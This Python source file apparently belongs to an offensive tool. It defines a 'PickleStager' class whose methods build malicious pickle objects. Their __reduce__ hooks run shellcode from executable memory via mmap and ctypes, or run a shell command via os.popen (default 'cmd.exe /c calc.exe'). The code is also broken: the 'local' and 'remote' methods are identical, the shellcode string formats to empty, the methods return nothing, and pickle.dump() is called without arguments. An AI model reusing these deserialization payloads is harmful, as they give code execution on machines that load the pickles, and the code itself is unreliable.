import pickle


class PickleStager:
    @staticmethod
    def shellcode_exec_local(shellcode: str):
        class Exec:
            def __reduce__(self):
                # https://stackoverflow.com/questions/32707932/executing-shellcode-in-python

                import ctypes
                import mmap

                # This shellcode will print "Hello World from shellcode!"
                shellcode = "".format(shellcode.encode())

                # Allocate an executable memory and write shellcode to it
                mem = mmap.mmap(
                    -1,
                    mmap.PAGESIZE,
                    mmap.MAP_SHARED,
                    mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                )
                mem.write(shellcode)

                # Get actual mmap address (I don't know the proper way to get the address sorry...)
                # Assuming x64
                addr = int.from_bytes(ctypes.string_at(id(mem) + 16, 8), "little")

                # Create the function
                functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
                fn = functype(addr)

                # Run shellcode
                return fn()

    @staticmethod
    def shellcode_exec_remote(shellcode: str):
        class Exec:
            def __reduce__(self):
                # https://stackoverflow.com/questions/32707932/executing-shellcode-in-python

                import ctypes
                import mmap

                # This shellcode will print "Hello World from shellcode!"
                shellcode = "".format(shellcode.encode())

                # Allocate an executable memory and write shellcode to it
                mem = mmap.mmap(
                    -1,
                    mmap.PAGESIZE,
                    mmap.MAP_SHARED,
                    mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                )
                mem.write(shellcode)

                # Get actual mmap address (I don't know the proper way to get the address sorry...)
                # Assuming x64
                addr = int.from_bytes(ctypes.string_at(id(mem) + 16, 8), "little")

                # Create the function
                functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
                fn = functype(addr)

                # Run shellcode
                return fn()

    @staticmethod
    def command_exec(command="cmd.exe /c calc.exe"):
        class Exec:
            def __reduce__(self):
                import os

                return (os.popen, (command,))

        pickle.dump()
